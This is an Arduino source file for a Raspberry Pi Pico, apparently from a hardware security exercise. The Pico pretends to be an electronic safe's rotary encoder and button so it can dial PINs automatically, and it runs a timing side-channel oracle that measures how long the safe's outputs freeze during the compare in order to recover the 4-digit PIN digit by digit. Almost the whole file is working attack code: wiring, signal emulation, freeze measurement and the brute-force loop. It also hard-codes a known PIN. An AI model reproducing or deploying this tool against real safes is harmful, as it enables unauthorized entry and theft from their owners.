// ---------------------------------------------------------------------------
// Rotary-encoder emulator for physical PIN brute-force (attack vector 4).
//
// An attacker Raspberry Pi Pico impersonates the safe's rotary encoder + push
// button, so the 4-digit PIN can be dialled without a human turning the knob.
//
// Clean rewrite around three primitives, per the bench findings:
//   turnOne(dir) - turn the encoder exactly one detent (one displayed digit)
//   pressButton() - press+release the button; the safe zeroes the shown digit
//                   on confirm, so this also resets believed to 0
//   gotoDigit(n)  - dial from the current believed digit to n (shortest path)
//
// TARGET (the safe, an RP2040), from firmware board_gpio_init:
//   GPIO 29 = encoder channel A   (both-edge IRQ -> quadrature decoder)
//   GPIO 27 = encoder channel B   (both-edge IRQ)
//   GPIO 28 = push button SW      (falling-edge IRQ)
//   After each button confirm the display returns to 0 (bench-confirmed).
//
// WIRING (attacker Pico -> target), bench-verified. Signals + common ground only.
//   Pico GP4 (A_OUT)  -> target A line (GPIO 29 net)
//   Pico GP2 (B_OUT)  -> target B line (GPIO 27 net)
//   Pico GP3 (SW_OUT) -> target SW line (GPIO 28 net)
//   Pico GND          -> target GND
//   Pico GP5 (SENSE)  -> a target output LED (input; for readiness/unlock sense)
//   DO NOT tie the two boards' 3V3 / VBUS together. Ground + the signal lines only.
//
// DRIVE MODEL: pull a line LOW or release it with INPUT_PULLUP. The Pico pull-up
// sources a weak HIGH; the output driver never drives HIGH.
//
// CONTROL: 115200-baud USB serial, single-char commands. See printHelp().
// ---------------------------------------------------------------------------

#include <Arduino.h>

// ----------------------------- Pin assignment ------------------------------
static const uint8_t PIN_A = 4;				   // -> target encoder A (GPIO 29)
static const uint8_t PIN_B = 2;				   // -> target encoder B (GPIO 27)
static const uint8_t PIN_SW = 3;			   // -> target button SW (GPIO 28)
static const uint8_t PIN_SENSE = 5;			   // <- target LED, readiness/unlock sense
static const uint8_t STATUS_LED = LED_BUILTIN; // on-board LED (activity)

// --------------------------- Calibration config ----------------------------
// Quadrature quarter-steps (single edges) per one displayed digit. A detented
// encoder emits 4 edges/detent; bench behaviour matches 4 here. Live: 'q<n>'.
static int QUARTERS_PER_STEP = 4;

// true if a CW turn makes the display count DOWN. Live-toggle with 'i'.
static bool INVERT_DIR = false;

// The digit the safe shows after a confirm (and at power-on): 0.
static const int RESET_DIGIT = 0;

// ------------------------------- Timing ------------------------------------
// Timing values remain adjustable because the target groups nearby encoder edges.
static uint32_t EDGE_MS = 5;	 // between quadrature edges inside one detent (tight burst)
static uint32_t DETENT_MS = 100; // gap after each detent; > the safe's 80 ms detent-group window
								 // so each detent is finalized as exactly one step (no merge/split)
static uint32_t HOLD_MS = 40;	 // button held low
static uint32_t RELEASE_MS = 60; // button released before the next action
static uint32_t DIGIT_GAP_MS = 80; // between confirmed digits

// ------------------------------- Sense (opt) -------------------------------
static bool SENSE_ENABLE = false;	  // console status only; the oracle reads GP5 directly

// ----------------------------- Oracle (CWE-208) ----------------------------
// The safe leaks the matched-prefix length as think-time. On the 4th button
// press its compare calls sleep_ms(50) once per matching leading PIN digit, and
// no GPIO toggles inside that loop, so every target output FREEZES for 50 ms * k
// (k = matched-prefix length, 0..4). We tap that freeze on SENSE (Pico GP5 wired
// to the target GPIO10 line) and turn its length into k, then recover the PIN
// digit by digit in <= 40 attempts -- no prior knowledge of the PIN.
//
// The freeze SHAPE on GPIO10 is a bench unknown (was the position-4 indicator lit
// during the compare? does the reject animation start inside the guard?), so every
// threshold is live-tunable and 't<code>' prints the raw edge trace for calibration.
static uint32_t ORACLE_BASE_US = 0;		 // fixed offset added to the measured freeze ('B<ms>')
static uint32_t ORACLE_STEP_US = 50000;	 // think-time per matching digit, ~sleep_ms(50) ('S<ms>')
static uint32_t ORACLE_GUARD_US = 3000;	 // stored by Q; not used by measureThinkTime
static uint32_t ORACLE_DECIDE_US = 320000; // stored by D; not used by measureThinkTime
static uint32_t ORACLE_WINDOW_US = 900000; // hard cap on one measurement ('W<ms>')
static uint32_t ATTEMPT_GAP_MS = 1500;	 // wait out the reject animation before the next try ('A<ms>')

// ------------------------------- Run state ---------------------------------
static int g_believed = RESET_DIGIT; // our belief of the shown digit (0..9)
static uint8_t g_qidx = 0;			 // quadrature state index 0..3

// Gray-coded quadrature states for (A,B); consecutive states differ by 1 bit.
static const uint8_t GRAY_A[4] = {1, 0, 0, 1};
static const uint8_t GRAY_B[4] = {1, 1, 0, 0};

// ------------------------------ Low-level I/O ------------------------------
// Open-drain: level 1 = release (we never source a hard HIGH), 0 = drive low.
// Release enables the Pico's own pull-up in parallel with the target's weak
// internal one, so on long shared wires the HIGH rises fast and clean instead of
// floating and picking up noise -- without that, the target's both-edge IRQ sees
// ringing as extra edges. It is still open-drain: a pull-up cannot fight the real
// encoder pulling the line to GND, so the two can share the net.
static inline void setLine(uint8_t pin, uint8_t level)
{
	if (level)
	{
		pinMode(pin, INPUT_PULLUP); // released, pulled HIGH (target + our pull-up)
	}
	else
	{
		pinMode(pin, OUTPUT);
		digitalWrite(pin, LOW); // active-low assert
	}
}

static inline void applyQuadState(uint8_t idx)
{
	setLine(PIN_A, GRAY_A[idx]);
	setLine(PIN_B, GRAY_B[idx]);
}

// Release all driven lines; the target's pull-ups restore the idle HIGH.
static void idleLines()
{
	g_qidx = 0;
	setLine(PIN_A, 1);
	setLine(PIN_B, 1);
	setLine(PIN_SW, 1);
}

// --------------------------------- Timing ----------------------------------
// Single knob for the inter-edge delay. Kept as a function so the adaptive
// readiness logic (next step) can replace the body without touching callers.
static inline uint32_t edgeDelayMs() { return EDGE_MS; }

// ------------------------------- Primitives --------------------------------
// Turn the encoder exactly one detent. dir > 0 = one digit up (CW), < 0 = down.
// Emits QUARTERS_PER_STEP quadrature edges in the right Gray direction, then a
// short settle gap. Updates g_believed by +/-1 (mod 10).
static void turnOne(int dir)
{
	int gdir = (dir >= 0) ? (INVERT_DIR ? -1 : +1) : (INVERT_DIR ? +1 : -1);
	// delayMicroseconds waits to an absolute timer mark, so a USB IRQ cannot
	// stretch an inter-edge gap and split one detent into two counts. Interrupts
	// stay ON -- masking them starves the USB-CDC console and hangs it.
	for (int k = 0; k < QUARTERS_PER_STEP; k++)
	{
		g_qidx = (uint8_t)((g_qidx + (gdir > 0 ? 1 : 3)) & 3);
		applyQuadState(g_qidx);
		delayMicroseconds(edgeDelayMs() * 1000);
	}
	delay(DETENT_MS); // finalize this detent before the next
	g_believed = ((g_believed + (dir >= 0 ? 1 : 9)) % 10 + 10) % 10;
}

// Press and release the button. The safe zeroes the shown digit on confirm, so
// believed goes back to RESET_DIGIT.
static void pressButton()
{
	setLine(PIN_SW, 0);
	delay(HOLD_MS);
	setLine(PIN_SW, 1);
	delay(RELEASE_MS);
	g_believed = RESET_DIGIT;
}

// Dial from the believed digit to target (0..9), taking the shorter direction.
static void gotoDigit(int target)
{
	int up = ((target - g_believed) % 10 + 10) % 10; // steps turning up
	int down = (10 - up) % 10;						  // steps turning down
	if (up == 0)
		return;
	if (up <= down)
		for (int i = 0; i < up; i++)
			turnOne(+1);
	else
		for (int i = 0; i < down; i++)
			turnOne(-1);
}

// Enter one 4-digit code from a known start (display at 0). Each digit is dialled
// then confirmed; the confirm resets the display to 0 for the next digit.
static void enterPin(int pin)
{
	int d[4] = {(pin / 1000) % 10, (pin / 100) % 10, (pin / 10) % 10, pin % 10};
	idleLines();
	g_believed = RESET_DIGIT;
	for (int i = 0; i < 4; i++)
	{
		gotoDigit(d[i]);
		pressButton();
		if (i < 3)
			delay(DIGIT_GAP_MS);
	}
	idleLines();
}

// ------------------------------- Sense probe -------------------------------
// Watch SENSE for a few seconds and report edge activity. Used on the bench to
// find which target LED carries a useful signal (probe candidates until edges>0).
static void senseMonitor(long seconds)
{
	if (seconds < 1)
		seconds = 3;
	pinMode(PIN_SENSE, INPUT);
	Serial.printf("[mon] watching SENSE (Pico GP%d) for %lds...\r\n", PIN_SENSE, seconds);
	uint32_t endMs = millis() + (uint32_t)seconds * 1000u;
	int last = digitalRead(PIN_SENSE);
	uint32_t edges = 0, minGap = 0xffffffffu, maxGap = 0, lastEdge = micros();
	uint32_t hi = 0, tot = 0;
	while ((int32_t)(millis() - endMs) < 0)
	{
		int v = digitalRead(PIN_SENSE);
		tot++;
		if (v)
			hi++;
		if (v != last)
		{
			uint32_t now = micros(), gap = now - lastEdge;
			if (gap < minGap)
				minGap = gap;
			if (gap > maxGap)
				maxGap = gap;
			lastEdge = now;
			edges++;
			last = v;
		}
		delayMicroseconds(200);
	}
	Serial.printf("[mon] edges=%lu duty(high)=%lu%% minGap=%luus maxGap=%luus\r\n",
				  (unsigned long)edges, (unsigned long)(tot ? hi * 100 / tot : 0),
				  (unsigned long)(edges ? minGap : 0), (unsigned long)(edges ? maxGap : 0));
	if (edges == 0)
		Serial.println(F("[mon] no transitions -- static pin; try another GPIO"));
}

// ------------------------------ Oracle: measure ----------------------------
// Result of watching SENSE across one 4th-press compare.
struct Meas
{
	bool unlocked;	   // matched-prefix timing indicates k >= 4
	bool valid;		   // false only on a quiet-low window (SENSE likely mis-tapped)
	int k;			   // matched-prefix length 0..4
	uint32_t freezeUs; // measured think-time (first usable edge, or decide point)
	uint32_t edges;	   // usable edges seen (>= guard); reject animation gives many
	uint32_t tailUs;   // reserved field; current measurement does not use it
	int finalLevel;	   // SENSE level at the end of the window
};

// Matched-prefix length from the freeze duration: the safe holds every output
// frozen for sleep_ms(50) per matching leading digit, so freeze ~= step * k.
// k == 4 means all four matched -> the safe unlocked. No clamp here; the caller
// caps the reported value and reads k >= 4 as the unlock.
static int freezeToK(uint32_t freezeUs)
{
	long num = (long)freezeUs - (long)ORACLE_BASE_US;
	if (num < 0)
		num = 0;
	long k = (num + (long)(ORACLE_STEP_US / 2)) / (long)ORACLE_STEP_US;
	return (int)k;
}

// Watch SENSE after the 4th press. PIN_SW is asserted LOW at t0 by the caller,
// which has already synced the press to GPIO10's low phase, so SENSE reads LOW
// during the freeze. We time from t0 until SENSE goes HIGH: that instant ends the
// freeze (both reject and unlock drive GPIO10 high afterwards), and its length is
// step * k. Classify by that length alone -- a high level by itself never means
// unlock, since a reject ends high too. PIN_SW is released after HOLD_MS.
static Meas measureThinkTime(uint32_t t0)
{
	pinMode(PIN_SENSE, INPUT);
	bool released = false, sawLow = false, sawHigh = false;
	uint32_t highAt = 0;
	for (;;)
	{
		uint32_t el = (uint32_t)(micros() - t0);
		if (!released && el >= HOLD_MS * 1000u)
		{
			setLine(PIN_SW, 1); // release the 4th press mid-measurement
			released = true;
		}
		int v = digitalRead(PIN_SENSE);
		if (v == LOW)
			sawLow = true;
		else if (sawLow) // first HIGH after the frozen-low interval ends the freeze
		{
			highAt = el;
			sawHigh = true;
			break;
		}
		if (el >= ORACLE_WINDOW_US)
			break;
		delayMicroseconds(50);
	}
	if (!released)
		setLine(PIN_SW, 1);

	Meas m;
	m.freezeUs = sawHigh ? highAt : ORACLE_WINDOW_US;
	m.edges = sawHigh ? 1 : 0;
	m.finalLevel = sawHigh ? HIGH : digitalRead(PIN_SENSE);
	m.tailUs = 0;
	int k = freezeToK(m.freezeUs);
	m.k = (k > 4) ? 4 : k;
	m.unlocked = (k >= 4);
	// Valid only if we actually saw the low freeze end in a HIGH within one window;
	// a window with no HIGH (SENSE stuck) is flagged so calibration is not fooled.
	m.valid = sawHigh && (m.freezeUs < ORACLE_WINDOW_US);
	return m;
}

// ------------------------------ Oracle: attempt ----------------------------
// Dial one 4-digit code from a clean start and measure the 4th-press think-time.
// Same dialling model as enterPin(): display starts at 0 and zeroes on confirm.
static Meas attempt(int code)
{
	int d[4] = {(code / 1000) % 10, (code / 100) % 10, (code / 10) % 10, code % 10};
	idleLines();
	g_believed = RESET_DIGIT;
	for (int i = 0; i < 3; i++)
	{
		gotoDigit(d[i]);
		pressButton();
		delay(DIGIT_GAP_MS);
	}
	gotoDigit(d[3]);
	// Sync the press to GPIO10's low phase (it blinks as the position-4 indicator),
	// so the compare freeze is a measurable LOW interval, not hidden in a high phase.
	pinMode(PIN_SENSE, INPUT);
	for (uint32_t s = millis(); digitalRead(PIN_SENSE) == HIGH && (millis() - s) < 400;)
		;
	setLine(PIN_SW, 0); // 4th press, timed from here
	uint32_t t0 = micros();
	Meas m = measureThinkTime(t0); // releases PIN_SW after HOLD_MS
	g_believed = RESET_DIGIT;
	idleLines();
	return m;
}

static void printMeas(int code, const Meas &m)
{
	Serial.printf("[meas] %04d -> k=%d%s freeze=%luus edges=%lu tail=%luus final=%s%s\r\n",
				  code, m.k, m.unlocked ? " UNLOCK" : "", (unsigned long)m.freezeUs,
				  (unsigned long)m.edges, (unsigned long)m.tailUs, m.finalLevel ? "HIGH" : "LOW",
				  m.valid ? "" : " [INVALID: SENSE quiet-low -- check the GPIO10 tap]");
}

// ------------------------------ Oracle: attack -----------------------------
// Recover the PIN digit by digit. At position pos the earlier digits are already
// known-correct, so a trial digit d matches the prefix (k >= pos+1) iff d is the
// true digit -- otherwise the compare breaks at pos and leaks k == pos. We take
// the digit with the longest think-time and early-out the instant one reaches
// pos+1. Worst case 40 attempts, ~22 average. Any serial byte aborts.
static bool oracleAborted()
{
	if (Serial.available())
	{
		int c = Serial.read();
		if (c == 's' || c == 'x')
			return true;
	}
	return false;
}

static void oracleAttack()
{
	Serial.println(F("[oracle] recovering PIN via think-time (any key / 's' aborts)..."));
	Serial.printf("[oracle] base=%luus step=%luus guard=%luus decide=%luus gap=%lums\r\n",
				  (unsigned long)ORACLE_BASE_US, (unsigned long)ORACLE_STEP_US,
				  (unsigned long)ORACLE_GUARD_US, (unsigned long)ORACLE_DECIDE_US,
				  (unsigned long)ATTEMPT_GAP_MS);
	int pin[4] = {0, 0, 0, 0};
	int attempts = 0;
	for (int pos = 0; pos < 4; pos++)
	{
		int bestD = 0, bestK = -1;
		for (int d = 0; d <= 9; d++)
		{
			if (oracleAborted())
			{
				Serial.println(F("[oracle] aborted"));
				return;
			}
			// Known prefix pin[0..pos-1], trial digit d at pos, trailing zeros.
			int trial[4] = {0, 0, 0, 0};
			for (int j = 0; j < pos; j++)
				trial[j] = pin[j];
			trial[pos] = d;
			int code = trial[0] * 1000 + trial[1] * 100 + trial[2] * 10 + trial[3];
			Meas m = attempt(code);
			attempts++;
			printMeas(code, m);
			if (m.unlocked)
			{
				Serial.printf("[oracle] UNLOCKED with %04d after %d attempts\r\n", code, attempts);
				pin[pos] = d;
				Serial.printf("[oracle] recovered PIN = %d%d%d%d\r\n", pin[0], pin[1], pin[2], pin[3]);
				idleLines();
				return;
			}
			if (m.k > bestK)
			{
				bestK = m.k;
				bestD = d;
			}
			if (m.k >= pos + 1) // this digit already matches the prefix -> take it
			{
				bestD = d;
				break;
			}
			delay(ATTEMPT_GAP_MS); // let the reject animation finish before the next try
		}
		pin[pos] = bestD;
		Serial.printf("[oracle] position %d -> %d (k=%d), %d attempts so far\r\n", pos, bestD, bestK, attempts);
		delay(ATTEMPT_GAP_MS);
	}
	// All four positions decided without an incidental unlock: enter the code once.
	Serial.printf("[oracle] recovered PIN = %d%d%d%d, entering to confirm...\r\n",
				  pin[0], pin[1], pin[2], pin[3]);
	int code = pin[0] * 1000 + pin[1] * 100 + pin[2] * 10 + pin[3];
	Meas m = attempt(code);
	attempts++;
	printMeas(code, m);
	Serial.printf("[oracle] %s after %d attempts\r\n",
				  m.unlocked ? "UNLOCKED" : "did NOT unlock -- recheck calibration", attempts);
	idleLines();
}

// -------------------------------- Console ----------------------------------
static void printStatus()
{
	Serial.printf("[status] believed=%d q/step=%d invert=%d sense=%s\r\n",
				  g_believed, QUARTERS_PER_STEP, INVERT_DIR, SENSE_ENABLE ? "ON" : "OFF");
	Serial.printf("[timing] edge=%lu detent=%lu hold=%lu release=%lu digitgap=%lu (ms)\r\n",
				  (unsigned long)EDGE_MS, (unsigned long)DETENT_MS, (unsigned long)HOLD_MS,
				  (unsigned long)RELEASE_MS, (unsigned long)DIGIT_GAP_MS);
	Serial.printf("[oracle] base=%lu step=%lu guard=%lu decide=%lu window=%lu (ms) gap=%lums\r\n",
				  (unsigned long)(ORACLE_BASE_US / 1000), (unsigned long)(ORACLE_STEP_US / 1000),
				  (unsigned long)(ORACLE_GUARD_US / 1000), (unsigned long)(ORACLE_DECIDE_US / 1000),
				  (unsigned long)(ORACLE_WINDOW_US / 1000), (unsigned long)ATTEMPT_GAP_MS);
}

static void printHelp()
{
	Serial.println(F("\r\n=== encoder emulator (attack4) ==="));
	Serial.println(F("Primitives / jog:"));
	Serial.println(F("  .  turn CW one detent      ,  turn CCW one detent"));
	Serial.println(F("  p  press button (resets believed to 0)"));
	Serial.println(F("  u  digit +1                d  digit -1"));
	Serial.println(F("  z  declare believed = 0"));
	Serial.println(F("Config:"));
	Serial.println(F("  q<n> quarter-steps per digit (e.g. q4)   i  toggle direction"));
	Serial.println(F("  E<ms> edge delay   H<ms> button hold   G<ms> gap between digits"));
	Serial.println(F("Entry:"));
	Serial.println(F("  n<pin> enter a 4-digit code (e.g. n3952)   k  enter known PIN 3952"));
	Serial.println(F("Sense:"));
	Serial.println(F("  e  toggle SENSE status (oracle reads GP5 regardless)   m<sec> monitor edges"));
	Serial.println(F("Oracle (timing attack, needs SENSE on target GPIO10):"));
	Serial.println(F("  t<code> measure think-time of one code (t0000 => k=0, t3952 => k=4)"));
	Serial.println(F("  o  run oracle: recover PIN digit-by-digit (<=40 tries)  s/x aborts"));
	Serial.println(F("  B<ms> base   S<ms> step   Q<ms>/D<ms> stored only; no measurement effect"));
	Serial.println(F("  W<ms> window   A<ms> gap between attempts"));
	Serial.println(F("Misc:   I  release all lines (high-Z)   ?  status    h  this help"));
}

// Read a non-negative integer following a command char. Wide window so a human
// can type the number in a raw terminal; each digit re-arms the window.
static long readNumberArg()
{
	long v = 0;
	bool got = false;
	unsigned long t0 = millis();
	while (millis() - t0 < 1200)
	{
		while (Serial.available())
		{
			int c = Serial.peek();
			if (c >= '0' && c <= '9')
			{
				v = v * 10 + (Serial.read() - '0');
				got = true;
				t0 = millis();
			}
			else
			{
				Serial.read(); // consume terminator
				return got ? v : -1;
			}
		}
	}
	return got ? v : -1;
}

static void handleChar(int c)
{
	switch (c)
	{
	case '.':
		turnOne(+1);
		Serial.printf("[turn] CW  -> believed=%d\r\n", g_believed);
		break;
	case ',':
		turnOne(-1);
		Serial.printf("[turn] CCW -> believed=%d\r\n", g_believed);
		break;
	case 'p':
		pressButton();
		Serial.println(F("[press] believed:=0"));
		break;
	case 'u':
		gotoDigit((g_believed + 1) % 10);
		Serial.printf("[jog] up -> believed=%d\r\n", g_believed);
		break;
	case 'd':
		gotoDigit((g_believed + 9) % 10);
		Serial.printf("[jog] down -> believed=%d\r\n", g_believed);
		break;
	case 'z':
		g_believed = 0;
		Serial.println(F("[jog] believed:=0"));
		break;
	case 'q':
	{
		long n = readNumberArg();
		if (n >= 1 && n <= 64)
		{
			QUARTERS_PER_STEP = (int)n;
			Serial.printf("[cfg] quarters/step=%d\r\n", QUARTERS_PER_STEP);
		}
		else
			Serial.println(F("[cfg] usage: q<1..64>"));
	}
	break;
	case 'i':
		INVERT_DIR = !INVERT_DIR;
		Serial.printf("[cfg] invert=%d\r\n", INVERT_DIR);
		break;
	case 'E':
	{
		long n = readNumberArg();
		if (n >= 0)
		{
			EDGE_MS = (uint32_t)n;
			Serial.printf("[cfg] edge=%lums\r\n", (unsigned long)EDGE_MS);
		}
	}
	break;
	case 'H':
	{
		long n = readNumberArg();
		if (n >= 0)
		{
			HOLD_MS = (uint32_t)n;
			Serial.printf("[cfg] hold=%lums\r\n", (unsigned long)HOLD_MS);
		}
	}
	break;
	case 'G':
	{
		long n = readNumberArg();
		if (n >= 0)
		{
			DIGIT_GAP_MS = (uint32_t)n;
			Serial.printf("[cfg] digitgap=%lums\r\n", (unsigned long)DIGIT_GAP_MS);
		}
	}
	break;
	case 'n':
	{
		long n = readNumberArg();
		if (n >= 0 && n <= 9999)
		{
			Serial.printf("[enter] %04ld ...\r\n", n);
			enterPin((int)n);
			Serial.println(F("[enter] done -- check the safe (flash appears if it opened)"));
		}
		else
			Serial.println(F("[enter] usage: n<0..9999>"));
	}
	break;
	case 'k':
		Serial.println(F("[enter] known PIN 3952 ..."));
		enterPin(3952);
		Serial.println(F("[enter] done -- check the safe (flash appears if it opened)"));
		break;
	case 'e':
		SENSE_ENABLE = !SENSE_ENABLE;
		pinMode(PIN_SENSE, INPUT);
		Serial.printf("[cfg] SENSE=%s (GP%d)\r\n", SENSE_ENABLE ? "ON" : "OFF", PIN_SENSE);
		break;
	case 'm':
	{
		long n = readNumberArg();
		senseMonitor(n > 0 ? n : 3);
	}
	break;
	case 't':
	{
		long n = readNumberArg();
		if (n >= 0 && n <= 9999)
		{
			Meas m = attempt((int)n);
			printMeas((int)n, m);
		}
		else
			Serial.println(F("[meas] usage: t<0..9999> (t0000 expect k=0, t3952 expect k=4)"));
	}
	break;
	case 'o':
		oracleAttack();
		break;
	case 'B':
	{
		long n = readNumberArg();
		if (n >= 0)
		{
			ORACLE_BASE_US = (uint32_t)n * 1000u;
			Serial.printf("[cfg] oracle base=%lums\r\n", (unsigned long)n);
		}
	}
	break;
	case 'S':
	{
		long n = readNumberArg();
		if (n >= 1)
		{
			ORACLE_STEP_US = (uint32_t)n * 1000u;
			Serial.printf("[cfg] oracle step=%lums\r\n", (unsigned long)n);
		}
	}
	break;
	case 'Q':
	{
		long n = readNumberArg();
		if (n >= 0)
		{
			ORACLE_GUARD_US = (uint32_t)n * 1000u;
			Serial.printf("[cfg] oracle guard=%lums\r\n", (unsigned long)n);
		}
	}
	break;
	case 'W':
	{
		long n = readNumberArg();
		if (n >= 1)
		{
			ORACLE_WINDOW_US = (uint32_t)n * 1000u;
			Serial.printf("[cfg] oracle window=%lums\r\n", (unsigned long)n);
		}
	}
	break;
	case 'D':
	{
		long n = readNumberArg();
		if (n >= 0)
		{
			ORACLE_DECIDE_US = (uint32_t)n * 1000u;
			Serial.printf("[cfg] oracle decide=%lums\r\n", (unsigned long)n);
		}
	}
	break;
	case 'A':
	{
		long n = readNumberArg();
		if (n >= 0)
		{
			ATTEMPT_GAP_MS = (uint32_t)n;
			Serial.printf("[cfg] attempt gap=%lums\r\n", (unsigned long)n);
		}
	}
	break;
	case 'I':
		idleLines();
		g_believed = RESET_DIGIT;
		Serial.println(F("[idle] all output drivers off; input pull-ups enabled"));
		break;
	case '?':
		printStatus();
		break;
	case 'h':
		printHelp();
		break;
	default:
		break; // ignore whitespace / unknown
	}
}

// --------------------------------- Setup -----------------------------------
void setup()
{
	pinMode(STATUS_LED, OUTPUT);
	digitalWrite(STATUS_LED, LOW);
	idleLines();

	Serial.begin(115200);
	unsigned long t0 = millis();
	while (!Serial && millis() - t0 < 3000) { /* wait briefly for USB CDC */ }

	g_believed = RESET_DIGIT;
	printHelp();
	printStatus();
	Serial.println(F("[ready] '.'/','/'p' primitives, n<pin>/k to enter, o for the timing oracle."));
}

// --------------------------------- Loop ------------------------------------
void loop()
{
	while (Serial.available())
		handleChar(Serial.read());
}
